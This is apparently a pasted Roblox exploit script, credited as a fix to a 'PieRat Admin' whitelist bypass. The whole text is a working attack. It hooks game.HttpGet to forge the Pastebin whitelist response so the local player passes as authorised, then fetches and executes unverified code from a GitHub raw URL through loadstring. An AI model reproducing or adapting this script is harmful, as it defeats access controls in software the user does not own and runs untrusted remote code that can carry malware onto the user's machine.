-- pasted script.
-- credits to https://scriptblox.com/script/PieRat-Admin-or-Whitelist-'Bypass'_273 just did a simple fix.

local http
http = hookfunc(game.HttpGet, function(self, url)
    if url == "https://pastebin.com/raw/yaVAs76y" then 
       return string.format([[
       local userids = {
          [%i] = true
       }
       
       return userids
       ]], game:GetService("Players").LocalPlayer.UserId) -- userids = {[localplayer userid] = true} return userids
    end
    return http(self, url)
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/LisWaliKonia/WaleKonia123/main/WAliekonicaohh"))()
